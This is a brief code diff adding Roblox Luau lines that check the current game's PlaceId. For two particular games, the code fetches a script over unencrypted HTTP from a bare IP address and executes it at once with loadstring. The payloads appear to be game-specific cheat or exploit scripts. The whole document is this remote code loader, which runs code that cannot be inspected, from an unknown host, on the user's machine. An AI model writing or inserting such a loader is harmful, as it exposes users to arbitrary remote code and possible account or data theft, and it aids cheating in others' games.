@@ -1,1 +1,5 @@
-
+if game.PlaceId == 126884695634066 then
+     loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/gag.luau"))()
+elseif game.PlaceId == 142823291 then
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/mm2.luau"))()
+end
